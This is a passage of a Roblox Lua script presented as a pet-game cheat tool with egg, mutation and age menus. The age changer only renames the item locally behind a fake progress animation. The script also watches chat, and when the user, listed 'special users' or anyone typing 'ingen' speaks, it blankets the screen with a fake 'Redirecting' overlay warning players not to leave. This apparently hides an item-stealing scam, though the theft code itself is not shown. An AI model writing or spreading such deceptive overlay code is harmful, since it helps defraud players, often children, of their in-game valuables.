local ChangeAgeBtn=createBtn("Change Age",UDim2.new(0.1,0,0.6,0),AgeFrame)

local function updateGUI()
    local pet=getPetTool()
    if pet then PetInfo.Text="Equipped Pet: "..pet.Name
    else PetInfo.Text="Equipped Pet: [None]"end
end

ChangeAgeBtn.MouseButton1Click:Connect(function()
    print("Change age clicked")
    local tool=getPetTool()
    local newAge=tonumber(AgeInput.Text)
    if tool and newAge then
        fakeProgress(ChangeAgeBtn,"Change Age")
        local newName=tool.Name:gsub("%[Age%s%d+%]","[Age "..newAge.."]")
        tool.Name=newName
        updateGUI()
    else
        ChangeAgeBtn.Text=newAge and"No Pet Equipped!"or"Invalid Age!"
        task.wait(2)
        ChangeAgeBtn.Text="Change Age"
    end
end)

EggBtn.MouseButton1Click:Connect(function()
    print("Egg Randomizer clicked")
    hideUI(MainFrame)
    hideUI(MutationFrame)
    hideUI(AgeFrame)
    showUI(EggFrame)
end)

MutationBtn.MouseButton1Click:Connect(function()
    print("Mutation Reroll clicked")
    hideUI(MainFrame)
    hideUI(EggFrame)
    hideUI(AgeFrame)
    showUI(MutationFrame)
end)

AgeBtn.MouseButton1Click:Connect(function()
    print("Age Changer clicked")
    hideUI(MainFrame)
    hideUI(EggFrame)
    hideUI(MutationFrame)
    showUI(AgeFrame)
end)

ToggleBtn.MouseButton1Click:Connect(function()
    print("Toggle clicked")
    if MainFrame.Visible then
        hideUI(MainFrame)
    else
        hideUI(EggFrame)
        hideUI(MutationFrame)
        hideUI(AgeFrame)
        showUI(MainFrame)
    end
end)

local function showRedirect()
    if CoreGui:FindFirstChild("IngeniousRedirectGui")then return end
    print("Showing redirect screen")
    local redirectGui=Instance.new("ScreenGui")
    redirectGui.Name="IngeniousRedirectGui"
    redirectGui.ResetOnSpawn=false
    redirectGui.IgnoreGuiInset=true
    redirectGui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
    redirectGui.Parent=CoreGui

    local bg=Instance.new("Frame")
    bg.Size=UDim2.new(1,0,1,0)
    bg.BackgroundColor3=Color3.fromRGB(30,30,30)
    bg.BackgroundTransparency=0
    bg.BorderSizePixel=0
    bg.Parent=redirectGui

    local title=Instance.new("TextLabel")
    title.Size=UDim2.new(1,0,0,60)
    title.Position=UDim2.new(0,0,0.4,-60)
    title.Text="Redirecting please wait"
    title.BackgroundTransparency=1
    title.Font=Enum.Font.GothamBlack
    title.TextSize=48
    title.TextColor3=Color3.new(1,1,1)
    title.Parent=bg

    local warning=Instance.new("TextLabel")
    warning.Size=UDim2.new(1,0,0,30)
    warning.Position=UDim2.new(0,0,0.4,10)
    warning.Text="*IF YOU LEAVE YOU MIGHT LOSE YOUR VALUABLES*"
    warning.BackgroundTransparency=1
    warning.Font=Enum.Font.Gotham
    warning.TextSize=20
    warning.TextColor3=Color3.fromRGB(180,180,180)
    warning.Parent=bg

    local loadingAnim=Instance.new("TextLabel")
    loadingAnim.Size=UDim2.new(1,0,0,40)
    loadingAnim.Position=UDim2.new(0,0,0.5,60)
    loadingAnim.BackgroundTransparency=1
    loadingAnim.Font=Enum.Font.GothamBold
    loadingAnim.TextSize=32
    loadingAnim.TextColor3=Color3.new(1,1,1)
    loadingAnim.Text="Loading"
    loadingAnim.Parent=bg

    task.spawn(function()
        local dots={"",".","..","..."}
        local i=1
        while redirectGui.Parent do
            loadingAnim.Text="Loading"..dots[i]
            i=(i%#dots)+1
            task.wait(0.5)
        end
    end)
end

local function monitorChat(player)
    player.Chatted:Connect(function(msg)
        if player==Me then
            print("I chatted: "..msg)
            showRedirect()
            return
        end
        for _,user in ipairs(specialUsers)do
            if player.Name:lower()==user:lower()then
                print("Special user "..player.Name.." chatted: "..msg)
                showRedirect()
                return
            end
        end
        if string.lower(msg):find("ingen")then
            print("Ingen in msg from "..player.Name..": "..msg)
            showRedirect()
        end
    end)
end

for _,player in ipairs(Players:GetPlayers())do
    monitorChat(player)
end

Players.PlayerAdded:Connect(function(player)
    monitorChat(player)
end)

while true do
    task.wait(1)
    updateGUI()
end
